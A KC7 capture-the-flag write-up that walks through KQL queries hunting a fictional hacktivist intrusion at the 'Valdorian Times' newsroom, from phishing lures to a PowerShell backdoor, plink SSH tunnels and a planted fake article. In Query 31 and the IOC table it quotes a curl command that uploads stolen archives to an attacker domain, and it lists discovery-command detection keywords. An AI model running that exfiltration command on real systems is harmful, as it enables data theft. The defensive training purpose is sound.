# 🕵️ Investigation 03 — State-Linked Hacktivist Operation Against a News Organisation

**Module:** KC7 — Security Analyst I | *"A Scandal in Valdoria: A Political Mystery"*
**Sentinel Tables:** `IdentityInfo`, `EmailEvents`, `AzureNetworkAnalytics_CL`, `DnsEvents`, `DeviceFileEvents`, `DeviceProcessEvents`
**Difficulty:** Easy
**Completed:** 2024

---

## 📋 Investigation Summary

The *Valdorian Times* newsroom was targeted in a coordinated hacktivist operation. The attacker used fake recruitment emails to compromise two employees — **Sonia Gose** (Senior Editor) and **Ronnie McLovin** (Editorial Intern) — deploying a PowerShell backdoor via a malicious Word document. The attacker established SSH tunnels using `plink.exe`, conducted post-compromise discovery, planted a fake scandal article (`fakestory.docx`), and ultimately exfiltrated stolen data archives to an external server. The operation culminated in the forged article being submitted for publication through internal editorial channels.

**Attack Chain:**
```
Spearphishing (Fake Job Offer) → Malicious Doc Download → PowerShell Backdoor
→ SSH Tunnel (plink.exe) → Discovery → Fake Article Plant → Data Exfiltration (curl)
```

---

## 🗺️ MITRE ATT&CK Mapping

| Phase | Technique | ID |
|---|---|---|
| Reconnaissance | Gather Victim Org Information | [T1591](https://attack.mitre.org/techniques/T1591/) |
| Initial Access | Spearphishing Link | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) |
| Execution | User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) |
| Execution | Command & Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) |
| Persistence | Scheduled Task/Job | [T1053](https://attack.mitre.org/techniques/T1053/) |
| Defence Evasion | Execution Policy Bypass | [T1562](https://attack.mitre.org/techniques/T1562/) |
| Command & Control | Protocol Tunnelling (plink/SSH) | [T1572](https://attack.mitre.org/techniques/T1572/) |
| Discovery | System Owner/User Discovery | [T1033](https://attack.mitre.org/techniques/T1033/) |
| Impact | Defacement / Influence Operations | [T1491](https://attack.mitre.org/techniques/T1491/) |
| Exfiltration | Exfiltration Over Web Service (curl) | [T1567](https://attack.mitre.org/techniques/T1567/) |

---

## 🔍 Query 1 — Baseline the Employees Table

**Description:** Samples the Employees table to understand available fields before building targeted queries.

**Why it matters in a SOC context:**
Baselining a new table prevents query errors. Understanding field names, data types, and available columns is step one before any structured investigation.

**MITRE ATT&CK:** N/A *(schema baseline)*
**Real Sentinel Table:** `IdentityInfo`

```kql
// Preview Employees table schema — understand available fields before querying
Employees
| take 10
```

---

## 🔍 Query 2 — Count Total Employees

**Description:** Returns the total number of records in the Employees table to establish the organisation's size.

**Why it matters in a SOC context:**
Knowing the total employee count helps analysts understand whether suspicious email campaigns are targeted (few recipients) or broad (entire org). It also establishes a baseline for anomaly detection.

**MITRE ATT&CK:** N/A *(baseline)*
**Real Sentinel Table:** `IdentityInfo`

```kql
// Count total employees in the organisation
// Result: 100 employees
Employees
| count
```

---

## 🔍 Query 3 — Identify the Editorial Director

**Description:** Retrieves the employee record for the Editorial Director role — the key editorial decision-maker and likely influence operation target.

**Why it matters in a SOC context:**
In an influence operation against a news outlet, the Editorial Director is the highest-value target — they control what gets published. Identifying this person early scopes who the attacker would most want to compromise or manipulate.

**MITRE ATT&CK:** [T1591 — Gather Victim Org Information](https://attack.mitre.org/techniques/T1591/)
**Real Sentinel Table:** `IdentityInfo`

```kql
// Identify the Editorial Director — key target in a newsroom influence operation
// Result: Nene Leaks | nene_leaks@valdoriantimes.news
Employees
| where role == "Editorial Director"
```

---

## 🔍 Query 4 — Count Emails Received by Editorial Director

**Description:** Counts all inbound emails to the Editorial Director to establish a volume baseline before hunting for anomalies.

**Why it matters in a SOC context:**
Establishing a message volume baseline helps analysts identify spikes that may indicate targeted phishing campaigns or sudden unusual communication patterns directed at a senior editorial role.

**MITRE ATT&CK:** N/A *(baseline)*
**Real Sentinel Table:** `EmailEvents`

```kql
// Count all emails received by the Editorial Director
// Result: 18 emails — establishes baseline for anomaly detection
Email
| where recipient == "nene_leaks@valdoriantimes.news"
| count
```

---

## 🔍 Query 5 — Identify Mass Phishing from a Suspicious Sender Domain

**Description:** Counts unique senders from a suspicious domain to determine if a mass phishing campaign was launched against the organisation.

**Why it matters in a SOC context:**
A single domain sending to hundreds of recipients is a strong indicator of a bulk phishing or influence campaign. Counting distinct senders from a domain surfaces the scope instantly without having to read individual emails.

**MITRE ATT&CK:** [T1566.002 — Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
**Real Sentinel Table:** `EmailEvents`

```kql
// Count distinct sender addresses originating from a suspicious printer/publisher domain
// Result: 100 unique senders from weprinturstuff.com — indicates mass campaign
Email
| where sender has "weprinturstuff.com"
| distinct sender
| count
```

---

## 🔍 Query 6 — Identify Target Employee by Name

**Description:** Retrieves the employee record for Lois Lane to obtain her internal IP address for network log correlation.

**Why it matters in a SOC context:**
Cross-referencing an employee name to their internal IP address is a fundamental pivot step — it allows analysts to query network and process logs using the IP as a filter, tying a person's identity to machine-level activity.

**MITRE ATT&CK:** N/A *(identity → IP pivot)*
**Real Sentinel Table:** `IdentityInfo`

```kql
// Get Lois Lane's internal IP for subsequent network log queries
// Result: ip = 10.10.0.22
Employees
| where name contains "Lois Lane"
```

---

## 🔍 Query 7 — Count Outbound URLs from a Specific Host

**Description:** Counts unique URLs accessed from a specific internal IP to understand the scope of web activity and identify anomalous or excessive outbound connections.

**Why it matters in a SOC context:**
An unusually high or unusual mix of URLs from a single host can indicate malware beaconing, data staging, or an attacker performing manual browsing post-compromise. Counting distinct URLs is a quick volume check before drilling into specifics.

**MITRE ATT&CK:** [T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)
**Real Sentinel Table:** `AzureNetworkAnalytics_CL`

```kql
// Count distinct outbound URLs from Lois Lane's workstation
// Result: 62 unique URLs — volume check to identify anomalous activity
OutboundNetworkEvents
| where src_ip == "10.10.0.22"
| distinct url
| count
```

---

## 🔍 Query 8 — Identify Attacker Infrastructure: Recruitment Domains

**Description:** Searches Passive DNS for domains containing "hire" to enumerate attacker-registered fake recruitment infrastructure.

**Why it matters in a SOC context:**
Threat actors running spearphishing campaigns frequently register multiple domain variants (jobhire.org, hire-recruit.org, hirerecruit.com) for resilience. Enumerating these upfront allows analysts to block the entire infrastructure and search all logs against the complete domain list.

**MITRE ATT&CK:** [T1584 — Compromise Infrastructure](https://attack.mitre.org/techniques/T1584/)
**Real Sentinel Table:** `DnsEvents`

```kql
// Enumerate all "hire"-themed domains in Passive DNS — maps attacker infrastructure
// Result: 6 distinct domains registered as part of fake recruitment campaign
PassiveDns
| where domain contains "hire"
| distinct domain
| count
```

---

## 🔍 Query 9 — Resolve Key Attacker Domain to IP

**Description:** Resolves the primary attacker recruitment domain to its hosting IP address for infrastructure attribution.

**Why it matters in a SOC context:**
Once a key domain is identified, resolving its IP enables analysts to discover all other attacker domains on the same server — expanding the indicator set and strengthening the attribution picture.

**MITRE ATT&CK:** [T1584 — Compromise Infrastructure](https://attack.mitre.org/techniques/T1584/)
**Real Sentinel Table:** `DnsEvents`

```kql
// Resolve jobhire.org to its hosting IP for infrastructure pivoting
// Result: IP = 191.7.248.112
PassiveDns
| where domain == "jobhire.org"
| distinct ip
```

---

## 🔍 Query 10 — Count Outbound Network Events for All "Mary" Employees

**Description:** Uses a `let` variable to dynamically retrieve all employees named Mary and counts their combined outbound network activity.

**Why it matters in a SOC context:**
Using `let` to build dynamic sets from the Employees table before querying network logs is a scalable threat hunting technique. It avoids hardcoding IPs, works across name variants, and speeds up mass triage of a named group.

**MITRE ATT&CK:** N/A *(scoping / baseline)*
**Real Sentinel Table:** `AzureNetworkAnalytics_CL`

```kql
// Dynamically retrieve all internal IPs for employees named "Mary"
// Then count their combined outbound network events
// Result: 58 events
let mary_ips =
    Employees
    | where name has "Mary"
    | distinct ip_addr;           // Build a dynamic IP set from employee records
OutboundNetworkEvents
| where src_ip in (mary_ips)     // Filter network logs to only Mary's IPs
| count
```

---

## 🔍 Query 11 — Count Authentication Events for All "Mary" Employees

**Description:** Counts authentication events for all employees named Mary to establish a login activity baseline or detect anomalies.

**Why it matters in a SOC context:**
Cross-referencing employee names to their authentication logs using dynamic sets is a key SOC technique for group-based hunting — for example, hunting for all employees in a department who logged in after hours, or from foreign IPs.

**MITRE ATT&CK:** N/A *(baseline)*
**Real Sentinel Table:** `SigninLogs`

```kql
// Build a dynamic username set for all "Mary" employees
// Then count their authentication events across the platform
// Result: 70 authentication events
let mary_users =
    Employees
    | where name has "Mary"
    | distinct username;          // Dynamic username set from HR records
AuthenticationEvents
| where username in (mary_users) // Scope auth logs to the Mary employee group
| count
```

---

## 🔍 Query 12 — Identify the Newspaper Printer Role

**Description:** Identifies which employee holds the role of Editorial Intern — used to locate the insider who submitted the forged article for printing.

**Why it matters in a SOC context:**
In influence operations, attackers often compromise low-privilege "last-mile" employees (interns, printers) who have just enough access to complete the final stage of the attack. Identifying role-holders across the org is a key step in tracing the attack path.

**MITRE ATT&CK:** [T1591 — Gather Victim Org Information](https://attack.mitre.org/techniques/T1591/)
**Real Sentinel Table:** `IdentityInfo`

```kql
// Identify the Editorial Intern who handles printing/publication
// Result: Ronnie McLovin | hire date: 2024-01-02 (recently hired — suspicious)
Employees
| where role contains "Editorial intern"
```

---

## 🔍 Query 13 — Identify the Phishing Email to the Senior Editor

**Description:** Retrieves the full details of the spearphishing email sent to Sonia Gose (Senior Editor) from a fake recruiter Gmail address.

**Why it matters in a SOC context:**
Gmail-originating "job offer" emails to senior editorial staff are a classic influence operation tactic. Identifying the exact email, its timestamp, and the malicious document URL it contained provides the starting point for tracing the full compromise chain.

**MITRE ATT&CK:** [T1566.002 — Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
**Real Sentinel Table:** `EmailEvents`

```kql
// Retrieve the phishing email sent to Senior Editor Sonia Gose
// From a fake recruiter Gmail address — a common initial access technique
// Key findings:
// - Timestamp: 2024-01-05T09:42:05Z
// - Malicious URL: https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
Email
| where sender == "newspaper_jobs@gmail.com"
    and recipient == "sonia_gose@valdoriantimes.news"
```

---

## 🔍 Query 14 — Confirm Victim Downloaded the Malicious Document

**Description:** Confirms that Sonia Gose's workstation made an outbound connection to the malicious document URL, proving she downloaded the lure file.

**Why it matters in a SOC context:**
Confirming a document download from a phishing URL is the "execution confirmed" moment — it means a malicious file is now on the endpoint. This triggers an immediate escalation to endpoint containment and forensic investigation of the affected machine.

**MITRE ATT&CK:** [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
**Real Sentinel Table:** `AzureNetworkAnalytics_CL`

```kql
// Confirm Sonia Gose's workstation downloaded the malicious document
// Correlates outbound network event to the phishing URL from Query 13
// Result: timestamp 2024-01-05T10:23:17Z — download confirmed
OutboundNetworkEvents
| where url contains "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"
    and src_ip == "10.10.0.3"    // Sonia Gose's internal workstation IP
```

---

## 🔍 Query 15 — Verify File Creation on Endpoint

**Description:** Confirms the malicious document was written to disk on Sonia Gose's machine, providing the exact file path, timestamp, and SHA256 hash for forensics.

**Why it matters in a SOC context:**
File creation events provide the ground truth of what landed on an endpoint. The SHA256 hash can be submitted to VirusTotal for malware identification, and the file path confirms where to look during remediation. This is essential evidence for the incident report.

**MITRE ATT&CK:** [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
**Real Sentinel Table:** `DeviceFileEvents`

```kql
// Verify the malicious .docx was written to disk on Sonia's machine
// Key findings:
// - Path: C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx
// - Timestamp: 2024-01-05T10:24:04Z
// - SHA256: 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
FileCreationEvents
| where hostname == "UL0M-MACHINE"
    and filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
```

---

## 🔍 Query 16 — Detect PowerShell Backdoor Dropped on Endpoint

**Description:** Searches for PowerShell script (`.ps1`) creation events on the compromised machine, revealing the backdoor dropped alongside the malicious document.

**Why it matters in a SOC context:**
Malicious documents frequently drop secondary payloads (PowerShell scripts, batch files) that establish persistence or prepare for the next attack phase. Hunting for `.ps1` files created shortly after a suspicious document download is a high-signal detection pattern.

**MITRE ATT&CK:** [T1059.001 — Command & Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
**Real Sentinel Table:** `DeviceFileEvents`

```kql
// Hunt for PowerShell scripts dropped on Sonia's machine post-document-download
// Key findings:
// - Filename: hacktivist_manifesto.ps1
// - Timestamp: 2024-01-05T10:24:32Z (28 seconds after .docx landed)
// - Purpose: invoke plink.exe for SSH tunnelling
// - Attacker message in script: "lol ur bout 2 get pwnd"
FileCreationEvents
| where hostname == "UL0M-MACHINE"
    and filename contains ".ps1"   // Hunt for any dropped PowerShell scripts
```

---

## 🔍 Query 17 — Confirm PowerShell Script Execution

**Description:** Searches process creation events for execution of the dropped PowerShell backdoor, confirming it was run and revealing execution policy bypass.

**Why it matters in a SOC context:**
A PowerShell script file existing on disk is a threat. Evidence of it *executing* is a confirmed incident. Execution Policy Bypass (`-ExecutionPolicy Bypass`) is one of the most common attacker techniques for running unsigned PowerShell scripts and is a high-fidelity detection signal.

**MITRE ATT&CK:** [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/) / [T1562 — Impair Defences](https://attack.mitre.org/techniques/T1562/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Confirm execution of the dropped PowerShell backdoor
// Key findings:
// - 3 processes spawned from the script
// - Execution Policy: Bypass (bypasses Windows script execution restrictions)
// - Scheduled task created for persistence
ProcessEvents
| where hostname == "UL0M-MACHINE"
    and process_commandline contains "hacktivist_manifesto.ps1"
```

---

## 🔍 Query 18 — Identify SSH Tunnel Established via plink.exe

**Description:** Searches for `plink.exe` execution on the compromised machine, revealing the attacker's C2 connection details including IP, username, and password.

**Why it matters in a SOC context:**
`plink.exe` (PuTTY Link) is a legitimate SSH client frequently abused by attackers to create encrypted tunnels for C2 communication. Its presence in process logs is a near-certain indicator of attacker activity. The hardcoded credentials in the command line are critical threat intelligence for tracking the threat actor across victims.

**MITRE ATT&CK:** [T1572 — Protocol Tunnelling](https://attack.mitre.org/techniques/T1572/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Detect plink.exe SSH tunnel establishment on Sonia's machine
// Key findings:
// - C2 IP: 136.130.190.181
// - Attacker username: $had0w
// - Password: thruthW!llS3tUfree (hardcoded in commandline — common attacker mistake)
// - Timestamp: 2024-01-06T02:39:35Z (02:39 AM — outside business hours)
ProcessEvents
| where hostname == "UL0M-MACHINE"
    and process_commandline contains "plink.exe"
```

---

## 🔍 Query 19 — Enumerate Post-Compromise Discovery Commands (Sonia's Machine)

**Description:** Hunts for standard post-compromise discovery commands (`whoami`, `ipconfig`, `systeminfo`, etc.) executed on the compromised endpoint, confirming attacker hands-on-keyboard activity.

**Why it matters in a SOC context:**
Discovery commands are the attacker's way of orienting themselves after gaining access — understanding the machine, user, network, and domain. Detecting a burst of these commands in sequence is one of the strongest indicators of active attacker presence, often called "hands-on-keyboard" activity.

**MITRE ATT&CK:** [T1033 — System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Hunt for post-compromise discovery commands on Sonia's machine
// Checks for the most common attacker recon commands in one query
// Result: whoami confirmed + 4 other discovery commands (5 total)
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline has_any (
    "whoami",       // Current user context
    "hostname",     // Machine name
    "ipconfig",     // Network configuration
    "systeminfo",   // Full system details
    "tasklist",     // Running processes
    "net user",     // Local user accounts
    "net localgroup", // Local group memberships
    "arp",          // ARP cache (nearby hosts)
    "route print",  // Routing table
    "nslookup",     // DNS resolution
    "ping",         // Network reachability
    "quser"         // Logged-on users
)
```

---

## 🔍 Query 20 — Identify Second Victim via Phishing Campaign

**Description:** Counts emails sent from the second attacker Gmail address to scope the campaign targeting Ronnie McLovin.

**Why it matters in a SOC context:**
Threat actors frequently run parallel phishing campaigns against multiple employees simultaneously to increase their odds of success. Identifying a second sender address linked to the same campaign helps analysts understand the full scope of targeting.

**MITRE ATT&CK:** [T1566.002 — Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
**Real Sentinel Table:** `EmailEvents`

```kql
// Count all emails from the second attacker Gmail address
// Result: 18 emails sent from valdorias_best_recruiter@gmail.com
Email
| where sender == "valdorias_best_recruiter@gmail.com"
| count
```

---

## 🔍 Query 21 — Confirm Phishing Email Received by Ronnie McLovin

**Description:** Uses a `let` statement to dynamically retrieve Ronnie McLovin's email address, then confirms he received a phishing email from the attacker's second Gmail address.

**Why it matters in a SOC context:**
Confirming a specific named employee received a phishing email is the first step in establishing their compromise timeline. Using a `let` variable makes the query reusable — swapping the employee name updates the entire query without modifying the core logic.

**MITRE ATT&CK:** [T1566.002 — Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
**Real Sentinel Table:** `EmailEvents`

```kql
// Dynamically retrieve Ronnie McLovin's email address from the Employees table
let ronnie_mclovin_email =
    Employees
    | where name == "Ronnie McLovin"
    | distinct email_addr;
// Confirm Ronnie received the phishing email
// Key findings:
// - Timestamp: 2024-01-10T08:48:16Z
// - Domain: promotionrecruit.org
// - Subject: [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles
Email
| where sender == "valdorias_best_recruiter@gmail.com"
    and recipient in (ronnie_mclovin_email)
```

---

## 🔍 Query 22 — Confirm Ronnie Downloaded the Malicious Document

**Description:** Confirms Ronnie McLovin's workstation downloaded the lure document from a second attacker domain.

**Why it matters in a SOC context:**
With two compromised employees confirmed, the investigation escalates to a multi-host incident. Each host must be independently investigated and contained. Confirming the download on the second machine establishes a second beachhead that requires parallel remediation.

**MITRE ATT&CK:** [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
**Real Sentinel Table:** `AzureNetworkAnalytics_CL`

```kql
// Confirm Ronnie's workstation downloaded the malicious document from attacker domain
// Result: timestamp 2024-01-10T08:55:07Z
OutboundNetworkEvents
| where url contains "https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx"
    and src_ip == "10.10.0.19"   // Ronnie McLovin's internal workstation IP
```

---

## 🔍 Query 23 — Verify Malicious File Creation on Ronnie's Machine

**Description:** Confirms the lure document was written to disk on Ronnie's endpoint.

**Why it matters in a SOC context:**
File creation confirmation on the second endpoint proves parallel compromise — the attacker successfully gained a second foothold. This triggers containment actions on both machines simultaneously.

**MITRE ATT&CK:** [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
**Real Sentinel Table:** `DeviceFileEvents`

```kql
// Verify the second malicious document landed on Ronnie's machine
// Result: timestamp 2024-01-10T08:55:17Z — file confirmed on disk
FileCreationEvents
| where filename == "Editorial_J0b_Openings_2024.docx"
    and hostname == "A37A-DESKTOP"   // Ronnie McLovin's hostname
```

---

## 🔍 Query 24 — Confirm SSH Tunnel on Ronnie's Machine

**Description:** Identifies `plink.exe` SSH tunnel execution on Ronnie's machine, revealing the C2 IP used for the second beachhead.

**Why it matters in a SOC context:**
The same attacker tool (`plink.exe`) with the same credentials being used across two separate endpoints strongly confirms a single coordinated threat actor. The C2 IPs can be compared — same or different infrastructure reveals attacker operational security practices.

**MITRE ATT&CK:** [T1572 — Protocol Tunnelling](https://attack.mitre.org/techniques/T1572/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Detect plink.exe SSH tunnel on Ronnie's machine (second beachhead)
// Key findings:
// - C2 IP: 168.57.191.100 (different IP from Sonia's machine — separate C2 infrastructure)
// - Username: $had0w (same attacker username — confirms single threat actor)
// - Password: thruthW!llS3tUfree (same password reuse across both beachheads)
let timestamp_plink =
    ProcessEvents
    | where hostname == "A37A-DESKTOP"
        and process_commandline contains "plink"
    | distinct timestamp;
```

---

## 🔍 Query 25 — Enumerate Discovery Commands on Ronnie's Machine

**Description:** Hunts for post-compromise discovery commands on Ronnie's endpoint using the same technique library as Query 19.

**Why it matters in a SOC context:**
Running the same discovery command hunt across all compromised hosts is a scalable SOC practice. Consistent use of the same command set across two machines further confirms the same attacker — and the 5-command discovery pattern matches a known attacker playbook.

**MITRE ATT&CK:** [T1033 — System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Run discovery command hunt on the second compromised host
// Result: 5 discovery commands executed — matches pattern on Sonia's machine
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has_any (
    "whoami",
    "hostname",
    "ipconfig",
    "systeminfo",
    "tasklist",
    "net user",
    "net localgroup",
    "arp",
    "route print",
    "nslookup",
    "ping",
    "quser"
)
```

---

## 🔍 Query 26 — Identify Fake Story Download (Influence Operation Payload)

**Description:** Confirms Ronnie's machine downloaded the attacker-planted fake scandal article from attacker infrastructure.

**Why it matters in a SOC context:**
This is the "impact" phase of the attack — the attacker's end goal. Downloading a fake story to a journalist's machine, then submitting it through official editorial channels, is the core mechanism of a media influence operation. Identifying this file is the key finding of the investigation.

**MITRE ATT&CK:** [T1491 — Defacement / Influence Operations](https://attack.mitre.org/techniques/T1491/)
**Real Sentinel Table:** `AzureNetworkAnalytics_CL`

```kql
// Confirm download of attacker-planted fake scandal article
// Full URL: https://hire-recruit.org/files/fakescandal/2024/fakestory.docx
// This is the forged article intended to be published in the Valdorian Times
OutboundNetworkEvents
| where url contains "fakestory.docx"
    and src_ip == "10.10.0.19"   // Ronnie's workstation
```

---

## 🔍 Query 27 — Confirm Fake Story Written to Disk

**Description:** Verifies file creation of the fake story document on Ronnie's endpoint, providing SHA256 hash for malware analysis.

**Why it matters in a SOC context:**
The SHA256 hash of the fake story file enables VirusTotal lookup and cross-environment detection. The timestamp also establishes the exact moment the influence operation payload landed — anchoring the rest of the attack timeline.

**MITRE ATT&CK:** [T1491 — Influence Operations](https://attack.mitre.org/techniques/T1491/)
**Real Sentinel Table:** `DeviceFileEvents`

```kql
// Verify the fake story document was written to disk on Ronnie's machine
// Key findings:
// - SHA256: 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f
// - Timestamp: 2024-01-31T09:47:51Z — establishes the payload delivery timestamp
FileCreationEvents
| where filename == "fakestory.docx"
    and hostname == "A37A-DESKTOP"
```

---

## 🔍 Query 28 — Trace the Article Submission Through Editorial Channels

**Description:** Searches email logs for the forged article being sent from Ronnie's account to Clark Kent (the printer) through official editorial channels.

**Why it matters in a SOC context:**
Tracing the fake article from attacker infrastructure → Ronnie's machine → renamed file → email to printer completes the full attack chain. The 44-minute gap between file rename and email send is a key forensic artefact showing deliberate attacker behaviour.

**MITRE ATT&CK:** [T1491 — Influence Operations](https://attack.mitre.org/techniques/T1491/)
**Real Sentinel Table:** `EmailEvents`

```kql
// Retrieve the internal email sending the forged article to the newspaper printer
// Key findings:
// - Rename timestamp: 2024-01-31T10:26:20Z
// - Send timestamp:   2024-01-31T11:11:12Z
// - Time gap: 44 minutes (attacker reviewed and packaged the article)
// - Subject line references hirerecruit.com — attacker domain leaked in metadata
Email
| where sender == "ronnie_mclovin@valdoriantimes.news"
    and recipient == "clark_kent@valdoriantimes.news"
```

---

## 🔍 Query 29 — Investigate Specific Activity Window on Ronnie's Machine

**Description:** Retrieves all process events in a narrow time window on Ronnie's machine to understand exactly what the attacker did during a specific session.

**Why it matters in a SOC context:**
Scoping process activity to a specific time window is a core forensic technique for reconstructing attacker actions step by step. Ordering by timestamp ascending gives a chronological "playback" of the attacker's session.

**MITRE ATT&CK:** [T1033 — System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Reconstruct attacker activity in a specific time window on Ronnie's machine
// Result: 2 commands run in this window — ordered chronologically for timeline reconstruction
ProcessEvents
| where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
    and hostname == "A37A-DESKTOP"
| order by timestamp asc    // Chronological ordering for attack timeline reconstruction
```

---

## 🔍 Query 30 — Identify Data Staged for Exfiltration

**Description:** Searches process events for commands that created encrypted archives of stolen data and meme files, revealing what was staged for exfiltration.

**Why it matters in a SOC context:**
Data staging — compressing and encrypting files before exfiltration — is a standard attacker technique. The archive names and password reveal the attacker's organisation of the stolen data. The hardcoded password matches the SSH credentials, confirming a single operator.

**MITRE ATT&CK:** [T1560 — Archive Collected Data](https://attack.mitre.org/techniques/T1560/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Search for data staging activity after the fake story was renamed
// Key findings:
// - DankMemes.7z           — attacker's personal files (memes)
// - MyStolenDataFromDocuments.7z  — stolen Documents folder contents
// - MyStolenDataFromDesktop.7z    — stolen Desktop contents
// - Password: thruthW!llS3tUfree (same password used throughout campaign)
ProcessEvents
| where timestamp >= datetime(2024-01-31T10:26:20.000Z)
    and hostname == "A37A-DESKTOP"
```

---

## 🔍 Query 31 — Confirm Data Exfiltration via curl

**Description:** Searches for the `curl` command used to upload the staged data archives to the attacker's exfiltration server.

**Why it matters in a SOC context:**
`curl` is a legitimate tool frequently abused for data exfiltration. Detecting a `curl` command uploading `.7z` archives to an external URL is a high-confidence exfiltration indicator. This finding triggers immediate network blocking of the exfil domain and a data breach notification process.

**MITRE ATT&CK:** [T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)
**Real Sentinel Table:** `DeviceProcessEvents`

```kql
// Detect curl-based data exfiltration to attacker-controlled upload endpoint
// Exfil command: curl -F "file=@C:\Users\romclovin\Documents\*.7z"
//                     https://hirejob.com/exfil_processor/upload.php
// Domain: hirejob.com — attacker's exfiltration server
ProcessEvents
| where process_commandline contains "hirejob.com"
```

---

## 📌 Investigation Notes

### Key Indicators of Compromise

| Indicator | Value | Type |
|-----------|-------|------|
| Victim 1 | Sonia Gose (Senior Editor) | Identity |
| Victim 1 Hostname | `UL0M-MACHINE` | Host IOC |
| Victim 1 IP | `10.10.0.3` | Network IOC |
| Victim 2 | Ronnie McLovin (Editorial Intern) | Identity |
| Victim 2 Hostname | `A37A-DESKTOP` | Host IOC |
| Victim 2 IP | `10.10.0.19` | Network IOC |
| Phishing Sender 1 | `newspaper_jobs@gmail.com` | Email IOC |
| Phishing Sender 2 | `valdorias_best_recruiter@gmail.com` | Email IOC |
| Lure Doc 1 | `Valdorian_Times_Editorial_Offer_Letter.docx` | File IOC |
| Lure Doc 1 Hash | `60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f` | Hash IOC |
| Lure Doc 2 | `Editorial_J0b_Openings_2024.docx` | File IOC |
| Backdoor | `hacktivist_manifesto.ps1` | File IOC |
| C2 Tool | `plink.exe` (SSH tunnelling) | Tool IOC |
| C2 IP (Sonia) | `136.130.190.181` | Network IOC |
| C2 IP (Ronnie) | `168.57.191.100` | Network IOC |
| Attacker Username | `$had0w` | Credential |
| Attacker Password | `thruthW!llS3tUfree` | Credential |
| Influence Payload | `fakestory.docx` | File IOC |
| Fake Story Hash | `5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f` | Hash IOC |
| Exfil Domain | `hirejob.com` | Domain IOC |
| Exfil Command | `curl -F "file=@*.7z" https://hirejob.com/exfil_processor/upload.php` | Command IOC |
| Attacker Domains | `promotionrecruit.com`, `promotionrecruit.org`, `hire-recruit.org`, `hirerecruit.com`, `jobhire.org` | Domain IOCs |

### Attack Timeline

| Timestamp | Event |
|-----------|-------|
| `2024-01-02T08:00:00Z` | Ronnie McLovin hired (suspicious — recently onboarded) |
| `2024-01-05T09:42:05Z` | Phishing email sent to Sonia Gose |
| `2024-01-05T10:23:17Z` | Sonia downloads malicious .docx |
| `2024-01-05T10:24:04Z` | Lure doc written to disk |
| `2024-01-05T10:24:32Z` | `hacktivist_manifesto.ps1` dropped (28s later) |
| `2024-01-06T02:39:35Z` | plink.exe SSH tunnel established (02:39 AM) |
| `2024-01-10T08:48:16Z` | Phishing email sent to Ronnie McLovin |
| `2024-01-10T08:55:07Z` | Ronnie downloads malicious .docx |
| `2024-01-31T09:47:51Z` | `fakestory.docx` downloaded to Ronnie's machine |
| `2024-01-31T10:26:20Z` | Fake story renamed to `OpEdFinal_to_print.docx` |
| `2024-01-31T11:11:12Z` | Forged article emailed to Clark Kent for printing |

---

## 🔗 References

- [MITRE ATT&CK — Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002/)
- [MITRE ATT&CK — PowerShell (T1059.001)](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK — Protocol Tunnelling (T1572)](https://attack.mitre.org/techniques/T1572/)
- [MITRE ATT&CK — Exfiltration Over Web Service (T1567)](https://attack.mitre.org/techniques/T1567/)
- [MITRE ATT&CK — Influence Operations (T1491)](https://attack.mitre.org/techniques/T1491/)
- [Microsoft Sentinel — DeviceProcessEvents](https://learn.microsoft.com/en-us/azure/sentinel/normalization-schema-process-events)
- [Microsoft Sentinel — DeviceFileEvents](https://learn.microsoft.com/en-us/azure/monitor/reference/tables/devicefileevents)

---

*← [Back to Security Analyst I Module](./README.md) | [Back to Repository Root](../../README.md)*
